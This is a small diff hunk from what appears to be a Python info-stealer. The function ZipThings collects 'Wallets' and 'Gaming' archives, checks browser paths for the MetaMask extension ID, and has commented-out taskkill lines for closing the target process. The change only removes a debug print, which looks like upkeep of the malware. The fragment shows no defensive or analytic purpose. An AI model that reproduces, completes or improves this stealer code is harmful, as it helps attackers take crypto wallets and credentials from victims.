@@ -703,7 +703,6 @@ def ZipThings(path, arg, procc):
         global WalletsZip, GamingZip, OtherZip
         # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
         # os.system(f"taskkill /im {procc} /t /f")
-        print("salut")
 
         if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
             browser = path.split("\\")[4].split("/")[1].replace(' ', '')
